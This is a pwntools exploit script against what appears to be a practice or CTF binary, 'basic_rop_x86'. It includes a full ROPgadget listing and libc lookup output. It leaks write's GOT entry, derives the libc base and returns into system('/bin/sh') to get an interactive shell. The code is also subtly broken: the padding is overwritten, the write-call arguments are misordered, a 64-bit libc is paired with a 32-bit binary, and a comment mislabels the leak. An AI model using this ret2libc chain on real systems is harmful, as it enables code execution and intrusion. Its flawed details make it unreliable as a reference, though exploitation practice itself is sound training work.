from pwn import *

elf = ELF('./basic_rop_x86')
#p = process('./basic_rop_x86')

p = gdb.debug('./basic_rop_x86')
libc = ELF('./libc6_2.13-24ubuntu4_amd64.so')

"""
    read(0, buf, 0x400);
    write(1, buf, sizeof(buf));
""" 

"""
Gadgets information
============================================================
0x080487cd : adc al, 0x41 ; ret
0x0804856e : adc al, 0x50 ; call edx
0x080484dd : adc al, 0x68 ; xor al, 0xa0 ; add al, 8 ; call eax
0x08048412 : adc al, 0xa0 ; add al, 8 ; push 0x10 ; jmp 0x80483e0
0x08048516 : adc byte ptr [eax + 0x68], dl ; xor al, 0xa0 ; add al, 8 ; call edx
0x08048417 : adc byte ptr [eax], al ; add byte ptr [eax], al ; jmp 0x80483e0
0x08048574 : adc cl, cl ; jmp 0x80484f0
0x080484e7 : adc cl, cl ; repz ret
0x080485d5 : add al, 0x90 ; leave ; ret
0x08048548 : add al, 8 ; add ecx, ecx ; repz ret
0x080484e1 : add al, 8 ; call eax
0x0804851b : add al, 8 ; call edx
0x08048553 : add al, 8 ; mov edx, dword ptr [eax] ; test edx, edx ; jne 0x8048560 ; jmp 0x80484f0
0x080483f4 : add al, 8 ; push 0 ; jmp 0x80483e0
0x08048414 : add al, 8 ; push 0x10 ; jmp 0x80483e0
0x08048424 : add al, 8 ; push 0x18 ; jmp 0x80483e0
0x08048434 : add al, 8 ; push 0x20 ; jmp 0x80483e0
0x08048444 : add al, 8 ; push 0x28 ; jmp 0x80483e0
0x08048454 : add al, 8 ; push 0x30 ; jmp 0x80483e0
0x08048464 : add al, 8 ; push 0x38 ; jmp 0x80483e0
0x08048404 : add al, 8 ; push 8 ; jmp 0x80483e0
0x0804868f : add bl, dh ; ret
0x080483f7 : add byte ptr [eax], al ; add byte ptr [eax], al ; jmp 0x80483e0
0x0804861a : add byte ptr [eax], al ; add byte ptr [eax], al ; mov edi, dword ptr [ebp - 4] ; leave ; ret
0x080483d4 : add byte ptr [eax], al ; add esp, 8 ; pop ebx ; ret
0x080483f9 : add byte ptr [eax], al ; jmp 0x80483e0
0x0804861c : add byte ptr [eax], al ; mov edi, dword ptr [ebp - 4] ; leave ; ret
0x08048545 : add eax, 0x804a048 ; add ecx, ecx ; repz ret
0x0804854a : add ecx, ecx ; repz ret
0x08048572 : add esp, 0x10 ; leave ; jmp 0x80484f0
0x080484e5 : add esp, 0x10 ; leave ; repz ret
0x08048685 : add esp, 0xc ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x080485d3 : add esp, 4 ; nop ; leave ; ret
0x080483d6 : add esp, 8 ; pop ebx ; ret
0x08048452 : and al, 0xa0 ; add al, 8 ; push 0x30 ; jmp 0x80483e0
0x08048437 : and byte ptr [eax], al ; add byte ptr [eax], al ; jmp 0x80483e0
0x080487ca : and byte ptr [edi + 0xe], al ; adc al, 0x41 ; ret
0x0804869f : arpl word ptr [ecx], bx ; add byte ptr [eax], al ; add esp, 8 ; pop ebx ; ret
0x0804871b : call dword ptr [eax]
0x0804857a : call dword ptr [ebp - 0x77]
0x0804873f : call dword ptr [edi]
0x080484e3 : call eax
0x0804851d : call edx
0x08048620 : cld ; leave ; ret
0x08048467 : cmp byte ptr [eax], al ; add byte ptr [eax], al ; jmp 0x80483e0
0x080485cf : cmp eax, 0x83fffffe ; les eax, ptr [eax + edx*4] ; leave ; ret
0x08048546 : dec eax ; mov al, byte ptr [0xc9010804] ; repz ret
0x080487c8 : dec ebp ; push cs ; and byte ptr [edi + 0xe], al ; adc al, 0x41 ; ret
0x0804856d : in al, dx ; adc al, 0x50 ; call edx
0x080484dc : in al, dx ; adc al, 0x68 ; xor al, 0xa0 ; add al, 8 ; call eax
0x08048515 : in al, dx ; adc byte ptr [eax + 0x68], dl ; xor al, 0xa0 ; add al, 8 ; call edx
0x0804856b : in eax, 0x83 ; in al, dx ; adc al, 0x50 ; call edx
0x080484da : in eax, 0x83 ; in al, dx ; adc al, 0x68 ; xor al, 0xa0 ; add al, 8 ; call eax
0x080485d2 : inc dword ptr [ebx - 0x366ffb3c] ; ret
0x080487ce : inc ecx ; ret
0x080487cb : inc edi ; push cs ; adc al, 0x41 ; ret
0x0804868e : jbe 0x8048690 ; repz ret
0x08048567 : je 0x804855b ; push ebp ; mov ebp, esp ; sub esp, 0x14 ; push eax ; call edx
0x08048684 : jecxz 0x8048609 ; les ecx, ptr [ebx + ebx*2] ; pop esi ; pop edi ; pop ebp ; ret
0x0804861f : jge 0x804861d ; leave ; ret
0x080483fb : jmp 0x80483e0
0x0804855b : jmp 0x80484f0
0x08048559 : jne 0x8048560 ; jmp 0x80484f0
0x08048683 : jne 0x8048668 ; add esp, 0xc ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x08048552 : lahf ; add al, 8 ; mov edx, dword ptr [eax] ; test edx, edx ; jne 0x8048560 ; jmp 0x80484f0
0x080483d2 : lcall 0x8c4, 0x83000000 ; pop ebx ; ret
0x0804868d : lea esi, [esi] ; repz ret
0x08048575 : leave ; jmp 0x80484f0
0x080484e8 : leave ; repz ret
0x080485d7 : leave ; ret
0x080485d4 : les eax, ptr [eax + edx*4] ; leave ; ret
0x080483d7 : les ecx, ptr [eax] ; pop ebx ; ret
0x08048686 : les ecx, ptr [ebx + ebx*2] ; pop esi ; pop edi ; pop ebp ; ret
0x08048573 : les edx, ptr [eax] ; leave ; jmp 0x80484f0
0x080484e6 : les edx, ptr [eax] ; leave ; repz ret
0x08048547 : mov al, byte ptr [0xc9010804] ; repz ret
0x08048544 : mov byte ptr [0x804a048], 1 ; leave ; repz ret
0x08048619 : mov eax, 0 ; mov edi, dword ptr [ebp - 4] ; leave ; ret
0x0804856a : mov ebp, esp ; sub esp, 0x14 ; push eax ; call edx
0x080484b0 : mov ebx, dword ptr [esp] ; ret
0x0804861e : mov edi, dword ptr [ebp - 4] ; leave ; ret
0x08048555 : mov edx, dword ptr [eax] ; test edx, edx ; jne 0x8048560 ; jmp 0x80484f0
0x080485d6 : nop ; leave ; ret
0x080484af : nop ; mov ebx, dword ptr [esp] ; ret
0x080484ad : nop ; nop ; mov ebx, dword ptr [esp] ; ret
0x080484ab : nop ; nop ; nop ; mov ebx, dword ptr [esp] ; ret
0x08048687 : or al, 0x5b ; pop esi ; pop edi ; pop ebp ; ret
0x080483f2 : or al, 0xa0 ; add al, 8 ; push 0 ; jmp 0x80483e0
0x080484e2 : or bh, bh ; rol byte ptr [ebx - 0xc36ef3c], 1 ; ret
0x0804851c : or bh, bh ; rol byte ptr [ebx - 0xc36ef3c], cl ; ret
0x08048407 : or byte ptr [eax], al ; add byte ptr [eax], al ; jmp 0x80483e0
0x08048549 : or byte ptr [ecx], al ; leave ; repz ret
0x0804868b : pop ebp ; ret
0x08048688 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x080483d9 : pop ebx ; ret
0x0804868a : pop edi ; pop ebp ; ret
0x08048689 : pop esi ; pop edi ; pop ebp ; ret
0x080483f6 : push 0 ; jmp 0x80483e0
0x08048416 : push 0x10 ; jmp 0x80483e0
0x08048426 : push 0x18 ; jmp 0x80483e0
0x08048436 : push 0x20 ; jmp 0x80483e0
0x08048446 : push 0x28 ; jmp 0x80483e0
0x08048456 : push 0x30 ; jmp 0x80483e0
0x08048466 : push 0x38 ; jmp 0x80483e0
0x080484de : push 0x804a034 ; call eax
0x08048518 : push 0x804a034 ; call edx
0x08048406 : push 8 ; jmp 0x80483e0
0x080487cc : push cs ; adc al, 0x41 ; ret
0x080487c9 : push cs ; and byte ptr [edi + 0xe], al ; adc al, 0x41 ; ret
0x080487c6 : push cs ; xor byte ptr [ebp + 0xe], cl ; and byte ptr [edi + 0xe], al ; adc al, 0x41 ; ret
0x0804856f : push eax ; call edx
0x08048517 : push eax ; push 0x804a034 ; call edx
0x08048569 : push ebp ; mov ebp, esp ; sub esp, 0x14 ; push eax ; call edx
0x080484e9 : repz ret
0x080483c2 : ret
0x080484fe : ret 0xeac1
0x080484e4 : rol byte ptr [ebx - 0xc36ef3c], 1 ; ret
0x0804851e : rol byte ptr [ebx - 0xc36ef3c], cl ; ret
0x08048558 : sal byte ptr [ebp + 5], cl ; jmp 0x80484f0
0x080484b1 : sbb al, 0x24 ; ret
0x08048432 : sbb al, 0xa0 ; add al, 8 ; push 0x20 ; jmp 0x80483e0
0x08048427 : sbb byte ptr [eax], al ; add byte ptr [eax], al ; jmp 0x80483e0
0x08048447 : sub byte ptr [eax], al ; add byte ptr [eax], al ; jmp 0x80483e0
0x08048514 : sub esp, 0x10 ; push eax ; push 0x804a034 ; call edx
0x080484db : sub esp, 0x14 ; push 0x804a034 ; call eax
0x0804856c : sub esp, 0x14 ; push eax ; call edx
0x08048557 : test edx, edx ; jne 0x8048560 ; jmp 0x80484f0
0x080484df : xor al, 0xa0 ; add al, 8 ; call eax
0x08048519 : xor al, 0xa0 ; add al, 8 ; call edx
0x08048457 : xor byte ptr [eax], al ; add byte ptr [eax], al ; jmp 0x80483e0
0x080487c7 : xor byte ptr [ebp + 0xe], cl ; and byte ptr [edi + 0xe], al ; adc al, 0x41 ; ret

Unique gadgets found: 131

"""

offset = 72 
# get a leak of the stack address to calculate the address of the buffer in the stack 
buf = b'A' * offset
buf = p32(elf.symbols['write']) 
buf += p32(0x0804a034) # write to stdout
buf += p32(1) # file descriptor
buf += p32(elf.got['write']) # leak the address of write
buf += p32(4) # size of the buffer
buf += p32(elf.symbols['main']) # return to main

p.sendline(buf)

leak = u32(p.recv(4))
log.info(f'Leaked write address@PLT: {hex(leak)}')

"""
Results
libc6_2.13-24ubuntu4_amd64
Download	Click to download
All Symbols	Click to download
BuildID	9c5396c03118d369cc6f5ee25a99e904bc3e61db
MD5	116d9a3d1556b243e3625e82458656a6
__libc_start_main_ret	0x2130d
dup2	0xd7ba0
printf	0x51e70
puts	0x6ea30
read	0xd73f0
str_bin_sh	0x15d7f6
system	0x441e0
write	0xd7450
"""

libc.address = leak - libc.symbols['write']
log.info(f'Libc base address: {hex(libc.address)}')

# get a shell
buf = b'A' * offset
buf += p32(libc.symbols['system'])
buf += p32(0xdeadbeef)
buf += p32(next(libc.search(b'/bin/sh')))
p.sendline(buf)

p.interactive()
